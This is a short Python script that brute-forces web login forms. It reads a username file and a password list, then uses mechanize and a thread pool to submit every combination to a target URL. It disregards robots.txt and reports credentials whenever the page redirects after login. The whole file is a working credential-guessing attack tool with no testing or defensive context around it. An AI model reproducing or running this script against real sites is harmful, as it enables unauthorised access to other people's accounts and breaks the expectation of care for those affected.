#!/usr/bin/python

import mechanize
import logging
from concurrent.futures import ThreadPoolExecutor

def login(url, user, password):
    b = mechanize.Browser()
    b.set_handle_robots(False)
    b.open(url)
    b.select_form(nr=0)
    b.form['username'] = user
    b.form['password'] = password
    b.method = "POST"
    response = b.submit()
    return response,user,password

def main():
    url = input(">> Add url: ")
    list_user = input(">> Add username textfile: ")
    list_passwd = input(">> Add password-list: ")

    with open(list_user, "r") as f_user, open(list_passwd, "r") as f_pass:
        users = [user.strip() for user in f_user]
        passwords = [passwd.strip() for passwd in f_pass]

    with ThreadPoolExecutor() as executor:
        results = [executor.submit(login, url, user, password) for user in users for password in passwords]
        for result in results:
            response,user,password = result.result()
            if response.geturl() != url:
                print(f"Login found: User: {user} Pwd: {password}")
                break
            else:
                logging.debug(f"User: {user} Pwd: {password}")

if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    main()

